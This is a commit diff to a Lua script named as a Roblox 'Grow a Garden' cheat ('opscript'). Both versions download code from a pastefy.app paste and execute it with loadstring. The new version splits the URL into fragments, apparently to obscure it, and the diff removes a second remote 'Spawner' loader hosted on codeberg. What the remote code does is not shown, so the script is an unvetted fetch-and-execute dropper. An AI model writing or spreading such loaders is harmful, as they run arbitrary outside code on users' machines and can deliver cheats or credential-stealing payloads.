329e6055ace04133b07546dc9ca035b0b978c7e3
Ziadian <heeza9546@gmail.com>
2025-08-07 17:43:20 +0700

    Update growagarden_opscript.lua

--- growagarden_opscript.lua
+++ growagarden_opscript.lua
@@ -1,10 +1,9 @@
 local _ENV = getfenv and getfenv(1) or _ENV
-local url = ("https://"..("pastefy"..".app/SCPYxMwn/raw"))
-local s = game["HttpGet"](game, url)
-local run = (loadstring or function() end)(s)
-if type(run) == "function" then
-    pcall(run)
+local a, b, c = "https", "pastefy", ".app"
+local endpoint = "/swznQSU5/raw"
+local url = (a .. "://" .. b .. c .. endpoint)
+local response = game["HttpGet"](game, url)
+local loaded = (loadstring or function() end)(response)
+if typeof(loaded) == "function" then
+    pcall(loaded)
 end
-
-local Spawner = loadstring(game:HttpGet("https://codeberg.org/darkdarkdark/roblox/raw/branch/main/Spawner.lua"))()
-Spawner.Load()
